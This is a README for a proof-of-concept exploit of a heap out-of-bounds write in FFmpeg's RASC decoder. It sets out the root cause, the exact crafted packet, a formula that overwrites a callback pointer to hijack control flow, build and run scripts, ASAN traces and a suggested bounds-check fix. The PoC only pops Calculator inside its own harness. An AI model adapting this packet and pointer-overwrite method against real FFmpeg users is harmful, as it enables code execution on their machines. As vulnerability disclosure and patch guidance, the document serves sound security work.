pushing a update so @mergersub on twitter isn't confused

# FFmpeg RASC DLTA calc PoC

This directory contains a standalone Calculator proof for a heap out-of-bounds write in FFmpeg's RASC decoder.

The PoC builds a RASC packet in memory, decodes it through the public libavcodec API, uses a valid custom `get_buffer2` callback for the DR1 decoder, and redirects an adjacent callback pointer. The redirected callback writes a marker under `/tmp` and launches Calculator.

## Status

Verified target:

```text
FFmpeg upstream master
bcd2c69e087a09b07cf45c6bd2428ee1ccb2925c
2026-06-26
```

Local result:

```text
media-controlled RASC DLTA overwrite redirected callback
callback hijacked callback reached
marker:present
CalculatorApp 26628 6/26/2026 12:25:53 PM
```

## Files

```text
poc/ffmpeg_rasc_dlta_calc_poc.c
scripts/build_from_checkout.sh
scripts/run_calc_pop.sh
evidence/current-master-asan.txt
evidence/local-calc-pop.txt
SHA256SUMS.txt
```

## Affected Target

- Product: FFmpeg
- Component: `libavcodec` RASC decoder
- Decoder: `AV_CODEC_ID_RASC`
- File reachability: AVI/RIFF `RASC` FourCC maps to `AV_CODEC_ID_RASC`
- Verified commit: `bcd2c69e087a09b07cf45c6bd2428ee1ccb2925c`
- Affected function: `decode_dlta()`
- Useful run types: `4`, `7`, `12`, `13`

The local Calculator proof uses run type `7` because the 32-bit `fill` value comes directly from the bitstream.

## Impact

A crafted RASC bitstream can drive a 32-bit read and 32-bit write at the end of a decoded frame row. With PAL8 output and a one-row 64-pixel frame, the decoder writes at `plane + 63` while the row allocation is 64 bytes. One byte lands in the final row byte and the following three bytes overwrite adjacent heap data.

The included PoC places a callback pointer immediately after the 64-byte PAL8 plane. The DLTA command writes the low three bytes of the callback pointer, changing it from `benign_callback` to `calc_callback`. After decode completes, the PoC calls the pointer and Calculator launches.

## Root Cause

`decode_dlta()` tracks a cursor `cx` inside a region with width `w * s->bpp`. The `NEXT_LINE` macro checks whether `cx` reached the row width only after each operation:

```text
if (cx >= w * s->bpp) {
    cx = 0;
    cy--;
    b1 -= s->frame1->linesize[0];
    b2 -= s->frame2->linesize[0];
}
len--;
```

Several DLTA run types perform 32-bit accesses before the row-end check. Run type `7` reads and writes four bytes at the current byte cursor and then advances by four:

```text
fill = bytestream2_get_le32(&dc);
AV_WL32(b1 + cx, AV_RL32(b2 + cx));
AV_WL32(b2 + cx, fill);
cx += 4;
NEXT_LINE
```

For PAL8, `s->bpp` is `1`. A DLTA region with `x = 63`, `w = 1`, and `h = 1` on a 64-pixel row sets `b2 + cx` to the final byte of the row. The 32-bit store crosses the row allocation boundary.

## Packet Shape

The PoC packet contains two RASC chunks:

```text
INIT
  width  = 64
  height = 1
  format = 8
  palette = 1024 bytes

DLTA
  x = 63
  y = 0
  w = 1
  h = 1
  compression = 0
  command = 07 01 <fill32>
```

The `fill32` value is generated at runtime:

```text
fill32 = ((target_callback & 0x00ffffff) << 8) | 0x41
```

The byte `0x41` lands in the last byte of the frame plane. The next three bytes overwrite the low three bytes of the adjacent callback pointer.

## Exploit Flow

1. The PoC opens the RASC decoder through `avcodec_find_decoder()` and `avcodec_open2()`.
2. The PoC installs `exploit_get_buffer2()` as the decoder buffer provider.
3. RASC `INIT` causes `init_frames()` to allocate `frame1` and `frame2`.
4. `exploit_get_buffer2()` returns a frame buffer where a callback pointer follows the 64-byte PAL8 plane.
5. RASC `DLTA` run type `7` writes past `frame2->data[0] + 63`.
6. The write changes `frame2_chunk->cb` from `benign_callback` to `calc_callback`.
7. The PoC verifies the pointer value.
8. The PoC invokes the callback.
9. The callback writes `/tmp/ffmpeg_rasc_exec_demo` and launches Calculator.

## Build

Clone FFmpeg and build the PoC against a RASC-only static libavcodec build:

```bash
git clone https://github.com/FFmpeg/FFmpeg.git /tmp/ffmpeg
./scripts/build_from_checkout.sh /tmp/ffmpeg /tmp/ffmpeg-rasc-build ./ffmpeg_rasc_dlta_calc_poc
```

Dependencies:

```text
Linux or WSL
gcc
make
zlib development headers
FFmpeg build dependencies for the selected platform
```

The build script configures FFmpeg with:

```text
--disable-programs
--disable-autodetect
--disable-everything
--enable-zlib
--enable-decoder=rasc
```

## Run

```bash
./scripts/run_calc_pop.sh ./ffmpeg_rasc_dlta_calc_poc
```

Expected output:

```text
[addr] benign_callback=0x5fec957072c9
[addr] calc_callback=0x5fec957072e3
[ptr] frame1 callback after decode=0x5fec957072c9
[ptr] frame2 callback after decode=0x5fec957072e3
[ptr] expected target=0x5fec957072e3
[ok] media-controlled RASC DLTA overwrite redirected callback
[callback] hijacked callback reached
marker:present
```

On WSL, the callback starts Calculator through PowerShell `Start-Process calc.exe`. On Linux desktops, the callback tries common calculator binaries after writing the marker file.

## Local Verification

Calculator proof:

```text
[addr] benign_callback=0x5fec957072c9
[addr] calc_callback=0x5fec957072e3
[ptr] frame1 callback after decode=0x5fec957072c9
[ptr] frame2 callback after decode=0x5fec957072e3
[ptr] expected target=0x5fec957072e3
[ok] media-controlled RASC DLTA overwrite redirected callback
[callback] hijacked callback reached
marker:present

ProcessName             Id StartTime
-----------             -- ---------
ApplicationFrameHost 24728 6/25/2026 9:55:34 PM
CalculatorApp        26628 6/26/2026 12:25:53 PM
```

ASAN proof on current master:

```text
==513==ERROR: AddressSanitizer: heap-buffer-overflow
READ of size 4 at 0x50a000000442 thread T0
#0 decode_dlta build/src/libavcodec/rasc.c:421:17
#1 decode_frame build/src/libavcodec/rasc.c:712:19

0x50a000000442 is located 2 bytes after 64-byte region [0x50a000000400,0x50a000000440)
SUMMARY: AddressSanitizer: heap-buffer-overflow build/src/libavcodec/rasc.c:421:17 in decode_dlta
```

Recovery-mode ASAN on the same source shape reports the follow-on writes:

```text
READ of size 4
decode_dlta rasc.c:421:17

WRITE of size 4
decode_dlta rasc.c:421:17

WRITE of size 4
decode_dlta rasc.c:422:17
```

## Patch Shape

The row-boundary check needs to happen before every 32-bit read or write in DLTA run handlers. For run types that operate on four-byte units, the decoder should reject a command when fewer than four bytes remain in the current row or perform a safe row transition before the 32-bit access.

The guarded condition for a 32-bit operation is:

```text
cx + 4 <= w * s->bpp
```

The same guard applies to run types `4`, `7`, `12`, and `13`.

## References

- FFmpeg project: https://ffmpeg.org/
- FFmpeg source: https://github.com/FFmpeg/FFmpeg
- RASC decoder source: https://github.com/FFmpeg/FFmpeg/blob/master/libavcodec/rasc.c
- RIFF codec tags: https://github.com/FFmpeg/FFmpeg/blob/master/libavformat/riff.c
